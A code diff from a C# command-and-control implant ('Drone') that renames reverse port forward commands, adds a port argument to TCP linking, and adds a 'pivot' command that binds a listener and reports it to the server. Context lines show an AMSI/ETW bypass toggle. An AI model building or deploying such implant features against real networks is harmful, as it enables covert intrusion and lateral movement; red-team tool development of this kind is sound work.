@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Reflection;
 using System.Security.Principal;
 using System.Threading;
@@ -69,21 +70,21 @@ namespace Drone.Modules
                 new("amsi/etw", false),
                 new("true/false")
             }),
-            new Command("start-rportfwd", "Start a new reverse port forward", StartReversePortForward,
+            new Command("rportfwd-start", "Start a new reverse port forward", StartReversePortForward,
                 new List<Command.Argument>
                 {
                     new("bindPort", false),
                     new("forwardHost", false),
                     new("forwardPort", false),
                 }),
-            new Command("stop-rportfwd", "Stop a reverse port forward", StopReversePortForward,
+            new Command("rportfwd-stop", "Stop a reverse port forward", StopReversePortForward,
                 new List<Command.Argument>
                 {
                     new("bindPort", false)
                 }),
             
-            new Command("list-rportfwds", "List all active reverse port forwards", ListReversePortForwards),
-            new Command("purge-rportfwd", "Purge all active reverse port forwards", PurgeReversePortForwards),
+            new Command("rportfwd-list", "List all active reverse port forwards", ListReversePortForwards),
+            new Command("rportfwd-purge", "Purge all active reverse port forwards", PurgeReversePortForwards),
             new Command("rportfwd-inbound", "", HandleInboundResponse, visible: false),
             new Command("link", "Link to an SMB Drone", LinkSmbDrone, new List<Command.Argument>
             {
@@ -91,7 +92,13 @@ namespace Drone.Modules
             }),
             new Command("connect", "Connect to a TCP Drone", ConnectTcpDrone, new List<Command.Argument>
             {
-                new("hostname", false) 
+                new("target", false),
+                new("port", false)
+            }),
+            new Command("pivot", "Create a pivot handler", CreatePivotHandler, new List<Command.Argument>
+            {
+                new("handlerName", false),
+                new("bindPort", false)
             }),
             new Command("exit", "Exit this Drone", ExitDrone)
         };
@@ -292,7 +299,7 @@ namespace Drone.Modules
         private void LinkSmbDrone(DroneTask task, CancellationToken token)
         {
             var target = task.Arguments[0];
-            var handler = new DefaultSmbHandler(target);
+            var handler = new SmbHandler(target);
             
             Drone.AddChildDrone(handler);
         }
@@ -300,8 +307,25 @@ namespace Drone.Modules
         private void ConnectTcpDrone(DroneTask task, CancellationToken token)
         {
             var target = task.Arguments[0];
-            var handler = new DefaultTcpHandler(target);
+            var port = int.Parse(task.Arguments[1]);
+            var handler = new TcpHandler(target, port);
             
+            Drone.AddChildDrone(handler);
+        }
+        
+        private void CreatePivotHandler(DroneTask task, CancellationToken token)
+        {
+            var handlerName = task.Arguments[0];
+            var bindPort = task.Arguments[1];
+            var handler = new TcpHandler(int.Parse(bindPort));
+            
+            var pivot = new PivotHandler(handlerName, Dns.GetHostName(), bindPort);
+            var update = new DroneTaskUpdate(task.TaskGuid, DroneTaskUpdate.TaskStatus.Running, pivot.Serialize())
+            {
+                ServerModule = "Pivot"
+            };
+            
+            Drone.SendDroneTaskUpdate(update);
             Drone.AddChildDrone(handler);
         }
 
